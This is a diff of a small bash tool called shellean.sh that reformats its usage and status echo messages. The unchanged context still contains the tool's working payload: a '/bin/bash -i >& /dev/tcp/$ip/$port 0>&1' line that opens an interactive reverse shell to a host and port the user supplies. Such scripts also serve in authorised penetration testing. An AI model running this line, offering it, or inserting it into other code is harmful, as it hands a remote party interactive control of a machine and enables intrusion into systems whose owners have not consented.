@@ -28,7 +28,7 @@ license()
 
 help()
 {
-   echo "-> usage: $0 [-i <Internet Protocol Address> -p <Remote Port>]";
+   echo '-> usage: /bin/bash shellean.sh [-i <Internet Protocol Address> -p <Remote Port>]';
    echo '-> options:';
    echo '';
    echo '-l -> Print the GPL license and exit.';
@@ -78,15 +78,15 @@ elif [ -z $port ];
 
 else
   echo '--------------------------------------------------------------------------';
-  echo "[i] Starting shellean at $(date)";
+  echo '[i] Starting shellean at:' $(date);
   echo '--------------------------------------------------------------------------';
 
-  echo "[i] Connecting to ($ip:$port) ..";
+  echo '[i] Connecting to:' $ip:$port;
 
   /bin/bash -i >& /dev/tcp/$ip/$port 0>&1;
 
   echo '--------------------------------------------------------------------------';
-  echo "[i] Exiting shellean at ($(date))";
+  echo '[i] Exiting shellean at:' $(date);
   echo '--------------------------------------------------------------------------';
 fi
 
